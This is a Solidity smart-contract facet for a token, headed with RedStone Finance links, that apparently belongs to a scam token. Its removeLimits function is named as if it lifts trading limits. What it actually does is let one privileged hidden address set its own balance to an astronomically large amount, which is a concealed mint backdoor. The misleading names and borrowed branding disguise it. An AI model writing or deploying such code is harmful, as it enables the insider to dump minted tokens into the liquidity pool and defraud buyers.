/*  
   * SPDX-License-Identifier: MIT 

    Website:  https://redstone.finance/
    Twitter:  https://twitter.com/redstone_defi
    Telegram: https://t.me/redstonefinance
    Discord: https://discord.com/invite/PVxBZKFr46


*/
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
